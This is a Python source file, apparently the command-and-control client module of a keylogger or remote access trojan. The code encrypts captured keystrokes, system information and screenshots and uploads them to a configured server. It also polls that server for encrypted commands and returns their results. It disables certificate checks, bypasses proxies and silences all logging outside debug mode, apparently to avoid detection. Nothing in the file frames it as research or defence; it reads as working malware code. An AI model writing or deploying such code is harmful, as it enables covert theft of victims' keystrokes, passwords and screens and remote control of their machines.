import requests
import json
import logging
import gzip
import base64
from config import Config

# Configure logging based on DEBUG_MODE
if Config.DEBUG_MODE:
    logging.basicConfig(
        level=logging.INFO,
        format='[%(asctime)s] %(levelname)s: %(message)s',
        handlers=[
            logging.FileHandler(Config.ERROR_LOG_FILE),
            logging.StreamHandler()
        ]
    )
else:
    logging.getLogger().addHandler(logging.NullHandler())
    logging.getLogger().setLevel(logging.CRITICAL + 1)

class ServerCommunicator:
    def __init__(self, client_id, encryption_manager):
        self.client_id = client_id
        self.encryption = encryption_manager
        self.server_url = Config.SERVER_URL
        self.token = Config.SECRET_TOKEN

    def _send_request(self, endpoint, data=None, files=None):
        try:
            endpoint = endpoint.lstrip('?/')
            base_url = self.server_url.rstrip('/')
            url = f"{base_url}/{endpoint}"
            if Config.DEBUG_MODE:
                logging.info(f"Sending request to {url} with data: {data}, files: {files is not None}")
            response = requests.post(
                url,
                data=data,
                files=files,
                verify=False,
                timeout=Config.COMMAND_TIMEOUT,
                proxies={'http': None, 'https': None}
            )
            return self._handle_response(response)
        except requests.exceptions.RequestException as e:
            if Config.DEBUG_MODE:
                logging.error(f"Connection error: {str(e)}")
            raise CommunicationError(f"Connection error: {str(e)}")

    def _handle_response(self, response):
        if Config.DEBUG_MODE:
            logging.info(f"Received response: status={response.status_code}, text={response.text[:100]}...")
        if response.status_code == 200:
            try:
                data = response.json()
                if not isinstance(data, dict) or 'commands' not in data:
                    if Config.DEBUG_MODE:
                        logging.error("Invalid response format: Missing 'commands' key")
                    raise CommunicationError("Invalid response format: Missing 'commands' key")
                if not isinstance(data['commands'], list):
                    if Config.DEBUG_MODE:
                        logging.error("Invalid commands format: Expected list")
                    raise CommunicationError("Invalid commands format: Expected list")
                return data['commands']
            except json.JSONDecodeError:
                if Config.DEBUG_MODE:
                    logging.error("Invalid JSON response")
                raise CommunicationError("Invalid JSON response")
        else:
            if Config.DEBUG_MODE:
                logging.error(f"Server error: {response.status_code}, response: {response.text}")
            raise CommunicationError(f"Server error: {response.status_code}")

    def upload_data(self, keystrokes, system_info, screenshot=None):
        try:
            if not keystrokes or not isinstance(keystrokes, list):
                if Config.DEBUG_MODE:
                    logging.warning("Keystrokes is empty or not a list")
                keystrokes = ['']
            if not system_info or not isinstance(system_info, dict):
                if Config.DEBUG_MODE:
                    logging.warning("System_info is empty or not a dict")
                system_info = {'error': 'No system info provided'}

            keystrokes_str = ' '.join(str(k) for k in keystrokes if k)
            system_info_json = json.dumps(system_info, ensure_ascii=False)

            if Config.DEBUG_MODE:
                logging.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}, system_info_len={len(system_info_json)}")

            try:
                encrypted_keystrokes = self.encryption.encrypt(keystrokes_str)
                encrypted_system_info = self.encryption.encrypt(system_info_json)
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Encryption failed: {str(e)}")
                raise CommunicationError(f"Encryption failed: {str(e)}")

            if not encrypted_keystrokes or not encrypted_system_info:
                if Config.DEBUG_MODE:
                    logging.error("Encryption produced empty output")
                raise CommunicationError("Encryption produced empty output")

            encrypted_data = {
                "action": "upload_data",
                "client_id": self.client_id,
                "token": self.token,
                "keystrokes": encrypted_keystrokes,
                "system_info": encrypted_system_info
            }

            files = {}
            if screenshot:
                files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
                if Config.DEBUG_MODE:
                    logging.info("Including screenshot in upload")

            if Config.DEBUG_MODE:
                logging.info(f"Sending upload_data: {encrypted_data}, files: {files is not None}")

            response = requests.post(
                self.server_url,
                data=encrypted_data,
                files=files,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False
            )

            if response.status_code != 200:
                if Config.DEBUG_MODE:
                    logging.error(f"Upload failed: status={response.status_code}, response={response.text}")
                raise CommunicationError(f"Upload failed: {response.text}")

            if Config.DEBUG_MODE:
                logging.info("Upload successful")
            return response.json()

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Upload error: {str(e)}")
            raise CommunicationError(f"Upload error: {str(e)}")

    def fetch_commands(self):
        try:
            if Config.DEBUG_MODE:
                logging.info("Fetching commands...")
            response = self._send_request(
                "action=get_commands",
                data={
                    "action": "get_commands",
                    "client_id": self.client_id,
                    "token": self.token
                }
            )
            if Config.DEBUG_MODE:
                logging.info(f"Raw commands received: {response}")
            validated_commands = []
            for cmd in response:
                if not all(k in cmd for k in ('id', 'command')):
                    if Config.DEBUG_MODE:
                        logging.warning(f"Skipping invalid command: {cmd}")
                    continue
                try:
                    decrypted = self.encryption.decrypt(cmd['command'])
                    if Config.DEBUG_MODE:
                        logging.info(f"Decrypted command: {decrypted}")
                    command_data = json.loads(decrypted)
                    if Config.DEBUG_MODE:
                        logging.info(f"Parsed command data: {command_data}")
                    if 'type' not in command_data:
                        if Config.DEBUG_MODE:
                            logging.error(f"Command missing 'type': {command_data}")
                        continue
                    cmd['type'] = command_data['type']
                    validated_commands.append(cmd)
                except Exception as e:
                    if Config.DEBUG_MODE:
                        logging.error(f"Command validation failed: {str(e)}, command={cmd}")
            if Config.DEBUG_MODE:
                logging.info(f"Validated commands: {validated_commands}")
            return validated_commands
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to fetch commands: {str(e)}")
            raise CommunicationError(f"Failed to process commands: {str(e)}")

    def send_command_result(self, command_id, result):
        try:
            if Config.DEBUG_MODE:
                logging.info(f"Sending command result for command_id: {command_id}")
            compressed_result = gzip.compress(json.dumps(result).encode())
            encrypted_result = self.encryption.encrypt(base64.b64encode(compressed_result).decode())
            if Config.DEBUG_MODE:
                logging.info(f"Encrypted result: {encrypted_result[:50]}...")
            data = {
                'action': 'command_response',
                'client_id': self.client_id,
                'command_id': str(command_id),
                'result': encrypted_result,
                'token': self.token
            }
            response = requests.post(
                f"{self.server_url}/action=command_response",
                json=data,
                headers={'Content-Type': 'application/json'},
                verify=False,
                timeout=Config.COMMAND_TIMEOUT
            )
            response.raise_for_status()
            if Config.DEBUG_MODE:
                logging.info(f"Received response: status={response.status_code}, text={response.text}")
            return response.json()
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to send command result: {str(e)}")
            raise CommunicationError(f"Failed to send command result: {str(e)}")

class CommunicationError(Exception):
    pass